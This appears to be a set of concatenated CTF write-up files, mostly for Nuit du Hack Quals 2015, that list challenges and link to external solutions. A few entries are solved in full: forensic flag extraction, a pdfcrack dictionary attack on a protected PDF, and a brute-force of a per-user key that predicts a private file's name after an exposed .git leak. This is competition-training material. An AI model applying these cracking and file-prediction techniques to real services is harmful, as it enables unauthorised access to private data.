> This uploader deletes all /<\?|php/. So you cannot run php.
>
> http://recocta.chal.mmactf.link:9080/
> http://recocta.chal.mmactf.link:9081/ (Mirror 1)
> http://recocta.chal.mmactf.link:9082/ (Mirror 2)
> http://recocta.chal.mmactf.link:9083/ (Mirror 3)

> You can only upload files whose name is matched by /^[a-zA-Z0-9]+\.[a-zA-Z0-9]+$/.
>

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.init-labs.org/2015/09/07/mmact-web-100-challenge/> 
* <https://github.com/bl4de/ctf/blob/master/MMACTF_2015/Uploader_Web100.md>
* <http://fadec0d3.blogspot.com/2015/09/mma-1st-ctf-2015-uploader-100.html>
* [b01lers](https://b01lers.net/challenges/MMA%20CTF%202015/Uploader/54/)
* <https://0x90r00t.com/2015/09/08/mma-2015-web-uploader-write-up/>
* <https://github.com/ByteBandits/writeups/blob/master/mma-ctf-2015/web/uploader/chaitan94/README.md>
# Nuit du Hack Quals CTF 2015: Game Of Life

**Category:** Crypto
**Points:** 150
**Solves:** 178
**Description:** 

> "We're born alone, we live alone, we die alone. Only through our love and friendship can we create the illusion for the moment that we're not alone." (Orson Orwell)
> 
> Cells cells cells, the basis of life. Don't let them die and tell us their secret.
> 
> [http://static.challs.nuitduhack.com/GOL.tar.gz](GOL.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/NUITDUHACK/crypto/gameoflife>
* <https://hexpresso.wordpress.com/2015/04/05/quals_ndh-2k15-game-of-life-crypto-150-writeup/>
* <http://wiki.zenk-security.com/doku.php?id=ndhquals2015:game_of_life/> (French)
* <http://wiki.yobi.be/wiki/NDH_Writeups#Game-of-Life>
# Nuit du Hack Quals CTF 2015: WeshGrow

**Category:** Crypto
**Points:** 300
**Solves:** 10
**Description:**

> "HMAC MD5 or HMAC SHA1 are sooo obsoletes and sooo old. And they are clunky and sooo slooow! That is why, from today, we are introducing to the world a new HMAC algorithm. The best one invented ever : it's light, it's fast and it's secure, well it's the BHE or short for 'Best Hash Ever'." (C.E.C. - Cryptography Experts Company)
>
> Prove them wrong.
>
> <http://weshgrow.challs.nuitduhack.com/>

## Write-up

(TODO)

<http://weshgrow.challs.nuitduhack.com/flag?hmac=3f6933240ae234edddc27544d949238c>:

```
EXTRANET ACCESS
FLAG ? FLAG !
Can_I_haz_s3cureD_hm4c_plz?
```

The flag is `Can_I_haz_s3cureD_hm4c_plz`.

## Other write-ups and resources

* <http://tasteless.eu/2015/04/ndh-2015-quals-weshgrow/>
* <http://wiki.yobi.be/wiki/NDH_Writeups#Weshgrow>
* <http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-weshgrow-writeup/>
# Nuit du Hack Quals CTF 2015: SecureAuth

**Category:** Exploit
**Points:** 350
**Solves:** 16
**Description:** 

> "There is a building. Inside this building there is a level where no elevator can go, and no stair can reach. This level is filled with doors. These doors lead to many places. Hidden places. But one door is special. One door leads to the source." (The Keymaker)
> 
> Find the key. Open the door.
> 
> Static client @ [http://static.challs.nuitduhack.com/SecureAuthClient.tar.gz](SecureAuthClient.tar.gz)
> 
> <secureauth.challs.nuitduhack.com:4241>

## Write-up

(TODO)

## Other write-ups and resources

* <https://hexpresso.wordpress.com/2015/04/06/quals_ndh-2k15-secure-auth-exploit-350-writeup/>
* <http://www.matthieukeller.com/2015/04/ctf-ndh-qualifications.html#secureauth/>
* [French](http://wiki.zenk-security.com/doku.php?id=ndhquals2015:secureauth/)
* <http://xer.forgotten-legends.org/writeup/2015/ndh/ex350-SecureAuth.html>
# Nuit du Hack Quals CTF 2015: Updator

**Category:** Exploit
**Points:** 200
**Solves:** 40
**Description:** 

> Unhackable : "Not hackable; that cannot be hacked or broken into."
> 
> We manage updates and thus have fixes, this is not a PS3 as it is unhackable ... or is it?
> 
> <http://updator.challs.nuitduhack.com/>

## Write-up

(TODO)

## Other write-ups and resources

* <http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-updator-writeup/>
* <https://hexpresso.wordpress.com/2015/04/05/quals_ndh-2k15-updator-exploit-200-writeup/>
* <http://www.matthieukeller.com/2015/04/ctf-ndh-qualifications.html#updator/>
* <http://blog.0x80.org/ndh2k15-updator-writeup/>
* <http://xer.forgotten-legends.org/writeup/2015/ndh/ex200-updator.html>
* [French](http://wiki.zenk-security.com/doku.php?id=ndhquals2015:updator/)
# Nuit du Hack Quals CTF 2015: Bpythonastic

**Category:** Forensics
**Points:** 300
**Solves:** 121
**Description:** 

> <http://static.challs.nuitduhack.com/Bpythonastic.tar.gz>

[Alternative download](https://mega.nz/#!GE9x0A4K!2A-9Pc3DLOGPiu7cUSKnHIIs-l1PXJnaId0FOz_o92c)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on a writeup by [capturetheswag](http://capturetheswag.blogspot.com.au/2015/04/nuit-du-hack-quals-2015-bpythonastic.html).

After extracting the gzipped tar using `tar xvf Bpythonastic.tar.gz`, we get another tar `Bpythonastic.tar` that contains a 1.3GB file named `chall.raw`.

This file seems to be an ELF at first:

```bash
+bash-4.3$ file chall.raw 
chall.raw: ELF 64-bit LSB core file x86-64, version 1 (SYSV)
```

But it most likeley is a memory dump that begins with an ELF file.

[Some writeups](http://ipushino.blogspot.de/2015/04/ndh-ctf-2015-bpythonastic.html) used memory recovery /forensics tools like `volatility` to analyze the dump further.

However, the easiest solution is to apply `strings` to the memory dump and search for strings like `flag`, `python` and `challenge`:

```bash
strings -a chall.raw | grep -iE 'flag' | grep -i 'challenge'
>>> flag=Challenge()
>>> flag=Challenge()
>>> flag=Challenge()
flag=Challenge()
>>> flag=Challenge()                                                             
>>> flag=Challenge()                                                             
flag=Challenge()
flag=Challenge()
flag=Challenge()
flag=Challenge()
flag=Challenge()
flag=Challenge()
```

Looks like python code. We search the output of `strings -a chall.raw` for the complete python code to see this:

![](code.png)

We decode the base64 encoded string `KGljaGFsbApDaGFsbGVuZ2UKcDAKKGRwMQpTJ2ZsYWcnCnAyClMnYTYzOWEyMWE0YTc0NzAzZmEwNDJkNjE3NjgxYWE0NGJiNGQxYzA4YmM1ZmJmN2VmZDZiNDU1ODJiMGYwZDQwMycKcDMKc1MnaWQnCnA0CkkwCnNTJ2F1dGhvcicKcDUKUydZZ2dkcmFzaWwnCnA2CnNiLg==` to find:

```bash
$ echo 'KGljaGFsbApDaGFsbGVuZ2UKcDAKKGRwMQpTJ2ZsYWcnCnAyClMnYTYzOWEyMWE0YTc0NzAzZmEwNDJkNjE3NjgxYWE0NGJiNGQxYzA4YmM1ZmJmN2VmZDZiNDU1ODJiMGYwZDQwMycKcDMKc1MnaWQnCnA0CkkwCnNTJ2F1dGhvcicKcDUKUydZZ2dkcmFzaWwnCnA2CnNiLg==' | base64 --decode
(ichall
Challenge
p0
(dp1
S'flag'
p2
S'a639a21a4a74703fa042d617681aa44bb4d1c08bc5fbf7efd6b45582b0f0d403'
p3
sS'id'
p4
I0
sS'author'
p5
S'Yggdrasil'
p6
sb.
```

We see a sha256 hash, `a639a21a4a74703fa042d617681aa44bb4d1c08bc5fbf7efd6b45582b0f0d403`, that we crack using a hash database such as <http://md5decrypt.net/en/Sha256/> to find the flag (`Yougotit`):

![](flag.png)

## Other write-ups and resources

* <http://ipushino.blogspot.de/2015/04/ndh-ctf-2015-bpythonastic.html>
* <http://capturetheswag.blogspot.com.au/2015/04/nuit-du-hack-quals-2015-bpythonastic.html># Nuit du Hack Quals CTF 2015: PDFCeption

**Category:** Forensics
**Points:** 500
**Solves:** 7
**Description:** 

> "What is the most resilient parasite? Bacteria? A virus? An intestinal worm? An idea. Resilient... highly contagious. Once an idea has taken hold of the brain it's almost impossible to eradicate. An idea that is fully formed - fully understood - that sticks; right in there somewhere. " (Cobb)
> 
> Where is that idea located? Can you tell us what it is?
> 
> <http://static.challs.nuitduhack.com/PDFCeption.tar.gz>

[Alternative download](https://mega.nz/#!jMcFXKKa!3Tr9kOKaLQeqHwcgbATqMZaEVPFrW4IxWZw9Y-nEXgM)

## Write-up

(TODO)

## Other write-ups and resources

* <https://hexpresso.wordpress.com/2015/04/05/quals_ndh-2k15-pdception-misc-500-writeup/>
# Nuit du Hack Quals CTF 2015: Private

**Category:** Forensics
**Points:** 100
**Solves:** 114
**Description:** 

> "The quiet you are, the more you are able to ear"
> 
> [http://static.challs.nuitduhack.com/Private.tar.gz](Private.tar.gz)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is loosely based on [this writeup](https://hexpresso.wordpress.com/2015/04/05/quals_ndh-2k15-private-100-writeup/).

We are given a gzipped tar archive that we extract using `tar xvf Private.tar.fz` to find a pcap-ng capture file named `PrivateChannel.pcap.pcapng`.

Looking at the protocols used in the transmission, we see a bunch of STP, ICMP, DNS and some other requests.

The single TCP request that does stand out (because it's lonely :(), does not give us anything that tells us where our flag is:

![](./tcp.png)

However, after some fiddling with the data, we notice that the Identifiers of all IP layers of ICMP packets are inside the ASCII value range (32-126).

Most notably, the ID's begin to spell 'here is your flag' when only looking at the ICMP requests from IP `192.168.50.10` to `192.168.0.50`.

To see the flag, you can either apply a filter in wireshark `icmp and ip.src==192.168.50.10` and scroll down the requests to notice the flag in the Identifier bytes:

![](./demonstration.gif)

Or you could use apply the mentioned filter in `tshark` and grep for the offset range that contains the identifier:

```bash
$ tshark -r PrivateChannel.pcap.pcapng -x 'icmp and ip.src==192.168.50.10' | grep 0010
0010  00 38 00 0e 00 00 ff 01 d6 5a c0 a8 32 01 c0 a8   .8.......Z..2...
0010  00 38 00 0f 00 00 ff 01 d6 59 c0 a8 32 01 c0 a8   .8.......Y..2...
0010  00 38 00 10 00 00 ff 01 d6 58 c0 a8 32 01 c0 a8   .8.......X..2...
[...]
0010  00 54 09 69 00 00 40 01 bd b3 c0 a8 32 0a c0 a8   .T.i..@.....2...
0010  00 1c 00 22 00 00 40 01 c7 32 c0 a8 32 0a c0 a8   ..."..@..2..2...
0010  00 1c 00 68 00 00 40 01 c6 ec c0 a8 32 0a c0 a8   ...h..@.....2...
0010  00 1c 00 65 00 00 40 01 c6 ef c0 a8 32 0a c0 a8   ...e..@.....2...
0010  00 1c 00 72 00 00 40 01 c6 e2 c0 a8 32 0a c0 a8   ...r..@.....2...
0010  00 1c 00 65 00 00 40 01 c6 ef c0 a8 32 0a c0 a8   ...e..@.....2...
0010  00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8   ... ..@..4..2...
0010  00 1c 00 69 00 00 40 01 c6 eb c0 a8 32 0a c0 a8   ...i..@.....2...
0010  00 1c 00 73 00 00 40 01 c6 e1 c0 a8 32 0a c0 a8   ...s..@.....2...
0010  00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8   ... ..@..4..2...
0010  00 1c 00 79 00 00 40 01 c6 db c0 a8 32 0a c0 a8   ...y..@.....2...
0010  00 1c 00 6f 00 00 40 01 c6 e5 c0 a8 32 0a c0 a8   ...o..@.....2...
0010  00 1c 00 75 00 00 40 01 c6 df c0 a8 32 0a c0 a8   ...u..@.....2...
0010  00 1c 00 72 00 00 40 01 c6 e2 c0 a8 32 0a c0 a8   ...r..@.....2...
0010  00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8   ... ..@..4..2...
0010  00 1c 00 66 00 00 40 01 c6 ee c0 a8 32 0a c0 a8   ...f..@.....2...
0010  00 1c 00 6c 00 00 40 01 c6 e8 c0 a8 32 0a c0 a8   ...l..@.....2...
0010  00 1c 00 61 00 00 40 01 c6 f3 c0 a8 32 0a c0 a8   ...a..@.....2...
0010  00 1c 00 67 00 00 40 01 c6 ed c0 a8 32 0a c0 a8   ...g..@.....2...
0010  00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8   ... ..@..4..2...
0010  00 1c 00 3a 00 00 40 01 c7 1a c0 a8 32 0a c0 a8   ...:..@.....2...
0010  00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8   ... ..@..4..2...
0010  00 1c 00 53 00 00 40 01 c7 01 c0 a8 32 0a c0 a8   ...S..@.....2...
0010  00 1c 00 33 00 00 40 01 c7 21 c0 a8 32 0a c0 a8   ...3..@..!..2...
0010  00 1c 00 63 00 00 40 01 c6 f1 c0 a8 32 0a c0 a8   ...c..@.....2...
0010  00 1c 00 72 00 00 40 01 c6 e2 c0 a8 32 0a c0 a8   ...r..@.....2...
0010  00 1c 00 33 00 00 40 01 c7 21 c0 a8 32 0a c0 a8   ...3..@..!..2...
0010  00 1c 00 74 00 00 40 01 c6 e0 c0 a8 32 0a c0 a8   ...t..@.....2...
0010  00 1c 00 34 00 00 40 01 c7 20 c0 a8 32 0a c0 a8   ...4..@.. ..2...
0010  00 1c 00 67 00 00 40 01 c6 ed c0 a8 32 0a c0 a8   ...g..@.....2...
0010  00 1c 00 33 00 00 40 01 c7 21 c0 a8 32 0a c0 a8   ...3..@..!..2...
0010  00 1c 00 6e 00 00 40 01 c6 e6 c0 a8 32 0a c0 a8   ...n..@.....2...
0010  00 1c 00 74 00 00 40 01 c6 e0 c0 a8 32 0a c0 a8   ...t..@.....2...
```

The flag is `S3cr3t4g3nt`!

PS: You can also use `scapy` to print out the identifiers, as done [here](http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-private-writeup/) and [here](https://hexpresso.wordpress.com/2015/04/05/quals_ndh-2k15-private-100-writeup/).

## Other write-ups and resources

* <http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-private-writeup/>
* <https://hexpresso.wordpress.com/2015/04/05/quals_ndh-2k15-private-100-writeup/>
* <http://anee.me/nuit-du-hack-2015-quals-private-writeup/>
# Nuit du Hack Quals CTF 2015: Bleep

**Category:** Misc
**Points:** 200
**Solves:** 6
**Description:** 

> "“The clock is running. Make the most of today. Time waits for no man. Yesterday is history. Tomorrow is a mystery. Today is a gift. That's why it is called the present." (A)
> 
> Bleeeep Bleep Bleep Bleep Bleep Bleeeep Bleep Bleep Bleep Bleep Bleep Bleeeep Bleeeep Bleep.
> 
> I'm the bleep, unbleep me.
> 
> [http://static.challs.nuitduhack.com/Bleep.tar.gz](Bleep.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <http://wiki.yobi.be/wiki/NDH_Writeups#Bleep>
# Nuit du Hack Quals CTF 2015: FollowTheRabbit

**Category:** Misc
**Points:** 200
**Solves:** 0
**Description:** 

> "This is your last chance. After this, there is no turning back. You take the blue pill - the story ends, you wake up in your bed and believe whatever you want to believe. You take the red pill - you stay in Wonderland and I show you how deep the rabbit-hole goes." (Morpheus)
> 
> You took the red pill. How far does the rabbit-hole goes?
> 
> <http://followtherabbit.challs.nuitduhack.com/>

## Write-up

(TODO)

## Other write-ups and resources

* none yet# Nuit du Hack Quals CTF 2015: MacBeth

**Category:** Misc
**Points:** 350
**Solves:** 0
**Description:** 

> "I would challenge you to a battle of wits, but I see you are unarmed!" (S)
> 
> Use your wits, play the parts, thou shall know the answer.
> 
> [http://static.challs.nuitduhack.com/MacBeth.tar.gz](MacBeth.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# Nuit du Hack Quals CTF 2015: Raptor

**Category:** Misc
**Points:** 400
**Solves:** 19
**Description:** 

> <raptor.challs.nuitduhack.com:4142>

## Write-up

(TODO)

## Other write-ups and resources

* <https://hexpresso.wordpress.com/2015/04/05/ndh2k15_quals-raptor-misc400-writeup/>
* <http://www.matthieukeller.com/2015/04/ctf-ndh-qualifications.html#raptor/> (English)
* <http://wiki.zenk-security.com/doku.php?id=ndhquals2015:raptor/> (Fench)
# Nuit du Hack Quals CTF write-ups

* <http://quals.nuitduhack.com/>
* [Scoreboard](http://quals.nuitduhack.com/users) or [local alternative](scoreboard)
* [Number of solves per task](solves.txt)
* <https://www.nuitduhack.com/fr/quals.html>

## Completed write-ups

* [forensic/bpythonastic](forensic/bpythonastic)
* [forensic/private](forensic/private)
* [stegano/cooper](stegano/cooper)
* [web/facebox](web/facebox)

## External write-ups only

* [crypto/game-of-life](crypto/game-of-life)
* [crypto/weshgrow](crypto/weshgrow)
* [exploit/secureauth](exploit/secureauth)
* [exploit/updator](exploit/updator)
* [forensic/pdfception](forensic/pdfception)
* [misc/bleep](misc/bleep)
* [misc/raptor](misc/raptor)
* [reverse/clark-kent](reverse/clark-kent)
* [reverse/crackme-prime](reverse/crackme-prime)
* [reverse/mass-surveillance-software](reverse/mass-surveillance-software)
* [reverse/superman](reverse/superman)
* [web/facesec](web/facesec)

## Missing write-ups

* [misc/followtherabbit](misc/followtherabbit)
* [misc/macbeth](misc/macbeth)
* [web/mickey](web/mickey)# Nuit du Hack Quals CTF 2015: Clark Kent

**Category:** Crackme/Reverse
**Points:** 150
**Solves:** 72
**Description:** 

> "There's a shadow inside all of us. But that doesn't mean you need to embrace it. You decide who you really are. And I know you'll make the right choice and become the hero you're destined to be." (Clark Kent)
> 
> Become that hero you're destined to be. Discover and evolve your reversing powers.
> 
> [http://static.challs.nuitduhack.com/clark.tar.gz](clark.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/NUITDUHACK/reverse/clarkkent># Nuit du Hack Quals CTF 2015: Crackme Prime

**Category:** Crackme/Reverse
**Points:** 150
**Solves:** 90
**Description:** 

> "I am Optimus Prime, and I send this message to any surviving Autobots taking refuge among the stars. We are here, we are waiting."
> 
> Keygen me, I'm the Prime.
> 
> Validate your serial here : <http://crackmeprime.challs.nuitduhack.com/>
> 
> [http://static.challs.nuitduhack.com/prime.tar.gz](prime.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/NUITDUHACK/reverse/crackmeprime>
* <http://blog.0x80.org/ndh2k15-crackme-prime-writeup/># Nuit du Hack Quals CTF 2015: Mass Surveillance Software

**Category:** Crackme/Reverse
**Points:** 300
**Solves:** 27
**Description:** 

> CIA : "Our friends at the NSA had a cool song about their capabilities. So we decided to make our own software."
> 
> Here is the song: "Every mail you send. Every call you make. Every file you save. Every thought you save. I'm recording you.
> 
> With anyone you play. anywhere you stay. any place you check. any move you make. I'll be watching you. Oh can't you see. you belong to me. no more privacy. R.I.P democracy.
> 
> Every doc you leak. Every link you click. Every fight you take. Every step you make. We'll be watching you.
> 
> Since you're online i save every trace. You think you're hidden but i can see your face. You look around but you're doomed we're in thge place. You feel so cold and i love to feel your stress. I'm recording, recording, so baby, cheese.
> 
> Oh can't you see. You belong to me. No more privacy. R.I.P. Democracy. Every single word. Picture of your friends. And friends of your friends. All around the world.
> 
> We will spy on you. We will spy on you. We will spy on you. We will spy on you. We will spy on you. We will spy on you. We will spy on you."
> 
> ![](https://www.youtube.com/watch?v=AwWgbxXU5T0)
> 
> [http://static.challs.nuitduhack.com/mass.tar.gz](mass.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://hexpresso.wordpress.com/2015/04/05/quals_ndh-2k15-mass-surveillance-software-300-writeup/>
# Nuit du Hack Quals CTF 2015: Superman

**Category:** Crackme/Reverse
**Points:** 500
**Solves:** 49
**Description:** 

> "You will give the people of Earth an ideal to strive towards. They will race behind you, they will stumble, they will fall. But in time, they will join you in the sun, Kal. In time, you will help them accomplish wonders." (Jor-El)
> 
> Use your reversing super-powers to uncover the flag, be a superman.
> 
> [http://static.challs.nuitduhack.com/superman.tar.gz](superman.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://hexpresso.wordpress.com/2015/04/05/ndh-2015-superman-500-writeup/>
# Nuit du Hack Quals CTF 2015: Cooper

**Category:** Stegano
**Points:** 300
**Solves:** 29
**Description:** 

> "I am not crazy, my mother had me tested." (Sheldon)
> 
> What did Sheldon ... huh sorry, Dr. Cooper really mean?
> 
> [http://static.challs.nuitduhack.com/Cooper.tar.gz](Cooper.tar.gz)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on [this writeup](http://ipushino.blogspot.de/2015/04/ndh-ctf-2015-cooper.html).

We extract the `tar.gz` file with `tar xvf Cooper.tar.gz` to get a `PE32` Executable named Cooper.exe.

Using `binwalk`, we see that it contains a PDF and some Zip archives:

```bash
+bash-4.3$ binwalk Cooper.exe  | grep -v 'Zlib'
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Microsoft portable executable
111           0x6F            PDF document, version: "1.5"
496128        0x79200         Zip archive data, at least v1.0 to extract, name: "Stegano-BMP-master/"
496186        0x7923A         Zip archive data, at least v1.0 to extract, compressed size: 187,  uncompressed size: 564, name: "Stegano-BMP-master/Makefile"
496439        0x79337         Zip archive data, at least v1.0 to extract, compressed size: 144,  uncompressed size: 238, name: "Stegano-BMP-master/README.md"
496650        0x7940A         Zip archive data, at least v1.0 to extract, compressed size: 310,  uncompressed size: 533, name: "Stegano-BMP-master/decrypt.cpp"
497029        0x79585         Zip archive data, at least v1.0 to extract, name: "Stegano-BMP-master/easybmp/"
497095        0x795C7         Zip archive data, at least v1.0 to extract, compressed size: 782,  uncompressed size: 1489, name: "Stegano-BMP-master/easybmp/BSD_(revised)_license.txt"
497968        0x79930         Zip archive data, at least v1.0 to extract, compressed size: 9338,  uncompressed size: 48149, name: "Stegano-BMP-master/easybmp/EasyBMP.cpp"
507383        0x7BDF7         Zip archive data, at least v1.0 to extract, compressed size: 840,  uncompressed size: 2418, name: "Stegano-BMP-master/easybmp/EasyBMP.h"
508298        0x7C18A         Zip archive data, at least v1.0 to extract, compressed size: 823,  uncompressed size: 2815, name: "Stegano-BMP-master/easybmp/EasyBMP_BMP.h"
509200        0x7C510         Zip archive data, at least v1.0 to extract, compressed size: 9396,  uncompressed size: 31370, name: "Stegano-BMP-master/easybmp/EasyBMP_ChangeLog.txt"
518683        0x7EA1B         Zip archive data, at least v1.0 to extract, compressed size: 973,  uncompressed size: 2708, name: "Stegano-BMP-master/easybmp/EasyBMP_DataStructures.h"
519746        0x7EE42         Zip archive data, at least v1.0 to extract, compressed size: 558,  uncompressed size: 1975, name: "Stegano-BMP-master/easybmp/EasyBMP_VariousBMPutilities.h"
520399        0x7F0CF         Zip archive data, at least v1.0 to extract, name: "Stegano-BMP-master/easybmp/sample/"
520472        0x7F118         Zip archive data, at least v1.0 to extract, compressed size: 180430,  uncompressed size: 308278, name: "Stegano-BMP-master/easybmp/sample/EasyBMPbackground.bmp"
700996        0xAB244         Zip archive data, at least v1.0 to extract, compressed size: 820,  uncompressed size: 2835, name: "Stegano-BMP-master/easybmp/sample/EasyBMPsample.cpp"
701906        0xAB5D2         Zip archive data, at least v1.0 to extract, compressed size: 5599,  uncompressed size: 113266, name: "Stegano-BMP-master/easybmp/sample/EasyBMPtext.bmp"
707593        0xACC09         Zip archive data, at least v1.0 to extract, compressed size: 707,  uncompressed size: 1807, name: "Stegano-BMP-master/easybmp/sample/makefile"
708381        0xACF1D         Zip archive data, at least v1.0 to extract, compressed size: 368,  uncompressed size: 768, name: "Stegano-BMP-master/encrypt.cpp"
708818        0xAD0D2         Zip archive data, at least v1.0 to extract, compressed size: 28,  uncompressed size: 28, name: "Stegano-BMP-master/main.cpp"
708912        0xAD130         Zip archive data, at least v1.0 to extract, compressed size: 937,  uncompressed size: 2705, name: "Stegano-BMP-master/stegano.cpp"
709918        0xAD51E         Zip archive data, at least v1.0 to extract, compressed size: 137,  uncompressed size: 196, name: "Stegano-BMP-master/stegano.h"
712075        0xADD8B         End of Zip archive, comment: "6e73434c01138685e9ade26e76724b13f9d9b663"
```

Let's extract those with `foremost`:

```bash
+bash-4.3$ foremost Cooper.exe 
Processing: Cooper.exe
|foundat=Stegano-BMP-master/UT
foundat=Stegano-BMP-master/MakefileUT
foundat=Stegano-BMP-master/README.mdUT
foundat=Stegano-BMP-master/decrypt.cppUT
foundat=Stegano-BMP-master/easybmp/UT
foundat=Stegano-BMP-master/easybmp/BSD_(revised)_license.txtUT
foundat=Stegano-BMP-master/easybmp/EasyBMP.cppUT
foundat=Stegano-BMP-master/easybmp/EasyBMP.hUT
foundat=Stegano-BMP-master/easybmp/EasyBMP_BMP.hUT
foundat=Stegano-BMP-master/easybmp/EasyBMP_ChangeLog.txtUT
foundat=Stegano-BMP-master/easybmp/EasyBMP_DataStructures.hUT
foundat=Stegano-BMP-master/easybmp/EasyBMP_VariousBMPutilities.hUT
foundat=Stegano-BMP-master/easybmp/sample/UT
foundat=Stegano-BMP-master/easybmp/sample/EasyBMPbackground.bmpUT
foundat=Stegano-BMP-master/easybmp/sample/EasyBMPsample.cppUT
foundat=Stegano-BMP-master/easybmp/sample/EasyBMPtext.bmpUT
foundat=Stegano-BMP-master/easybmp/sample/makefileUT
foundat=Stegano-BMP-master/encrypt.cppUT
foundat=Stegano-BMP-master/main.cppUT
foundat=Stegano-BMP-master/stegano.cppUT
foundat=Stegano-BMP-master/stegano.hUT
*|
```

Though `Stegano-BMP-master` sounds promising, using it's `decrypt.ccp` or `stegano.cpp` does not work here, especially because we do not have any bmp that can contain steganography information.

So we turn our heads to the PDF file, `output/pdf/00000000.pdf`.

When opening this PDF, we are asked to enter a password we don't have. So we use `pdfcrack` with a dictionary-attack (dictionary: rockyou.txt):

```bash
+bash-4.3$ pdfcrack -w ./rockyou.txt output/pdf/00000000.pdf

PDF version 1.5
Security Handler: Standard
V: 2
R: 3
P: -1028
Length: 128
Encrypted Metadata: True
FileID: 001b62552dee6ce9fdc2b442e9f0cc0b
U: fdaee14bbe641f80b7e43e2b1b29358700000000000000000000000000000000
O: d03d46c7c843771542245350273096ebf319e82bbeb82a3326e43a2ccfeaf2ff
found user-password: 'sheldon'
```

That was easy! Let's open the PDF:

![](./sheldon.png)

The flag is `StephenHawkingSpentSomeTimeOnSteganoTrolling`.

## Other write-ups and resources

* <http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-cooper-writeup/>
* <http://ipushino.blogspot.de/2015/04/ndh-ctf-2015-cooper.html>
# Nuit du Hack Quals CTF 2015: faceBox

**Category:** Web
**Points:** 100
**Solves:** 18
**Description:** 

> A shady company decided to write their own software for storing files in the cloud.
> 
> "No no no, this is OUR filebox. We decline any responsability in the usage of our filebox. In any event your files get lost, trashed, stolen or spy on : it's your fault, not ours."
> 
> You are investigating on the security of their cloud storage as it might have disastrous consequences if it were to get hacked by malicious actors.
> 
> <http://prod.facebox.challs.nuitduhack.com/>

## Write-up

by [tomvangoethem](https://github.com/tomvangoethem)

_This write-up is made by the [HacknamStyle](https://www.hacknamstyle.net/) CTF team._

The first thing to figure out in this challenge, was that the website was running on the "production" server (hence the `prod` in the hostname). This then lead to discovering the development server (`.facebox.challs.nuitduhack.com/`), which contained a `.git/` folder.

After cloning the `.git/` folder, we found [a file](main.py) containing the method used to generate the random filename of uploaded files.
Basically, filenames were generated as follows: `md5(privkey + filename)` with `privkey` being a random value between 10000000 and 99999999, unique per user.

The first file uploaded to the service `confidentials.txt` private, i.e. we did not know the link. However, for the second file, we knew the original filename (`paste01.txt`) and the randomly generated filename (`3686d78a6e9d5258773a6ae0469d3ed4`). Bruteforcing the privkey for that user, we found the value was `95594864`.

Using this value, all we had to do is compute the "random" filename of the private file: `md5("95594864confidentials.txt")` → `35e2cb0b2e8bd40347ecd4e32767a060`. This allowed us to [see the `confidentials.txt` file](http://prod.facebox.challs.nuitduhack.com/files/view/35e2cb0b2e8bd40347ecd4e32767a060), which contained the flag: `M4x_M4i5_DR`.

## Other write-ups and resources

* <https://hexpresso.wordpress.com/2015/04/06/quals_ndh-2k15-facebox-web-100-writeup/>
* <http://www.matthieukeller.com/2015/04/ctf-ndh-qualifications.html#facebox/> (English)
* <http://wiki.zenk-security.com/doku.php?id=ndhquals2015:facebox/> (Fench)
# Nuit du Hack Quals CTF 2015: faceSec

**Category:** Web
**Points:** 100
**Solves:** 85
**Description:** 

> "Hello there,
> 
> We are looking for a developer or security consultant to secure our filebox system. We stumbled upon your LinkedIn profile and it seems like you would be a perfect candidate for this job. Could you please send us your CV and Motivation letter?
> 
> Thanks,
> 
> faceSec HR Director."
> 
> <http://facesec.challs.nuitduhack.com/>

## Write-up

(TODO)

## Other write-ups and resources

* <https://hexpresso.wordpress.com/2015/04/05/quals_ndh-2k15-facesec-web-100-writeup/>
* <http://www.matthieukeller.com/2015/04/ctf-ndh-qualifications.html#facesec/>
* <http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-facesec-writeup/>
* [French](http://wiki.zenk-security.com/doku.php?id=ndhquals2015:facesec/)
# Nuit du Hack Quals CTF 2015: Mickey

**Category:** Web
**Points:** 1
**Solves:** 0
**Description:** 

> Some of you may remember how we killed mickey last december. Are you ready to resurrect him for one last challenge? This one has been hiding online for the past few month, which explains the single tie break point if you ever feel bored during the quals.
> 
> This is a bonus challenge, you'll get free gifts.
> 
> <http://mickey.challs.nuitduhack.com>

## Write-up

(TODO)

## Other write-ups and resources

* none yet# nullcon HackIM 2015: Crypto Question 1

**Category:** Crypto
**Points:** 100
**Author:**
**Description:**

>Find the key: 
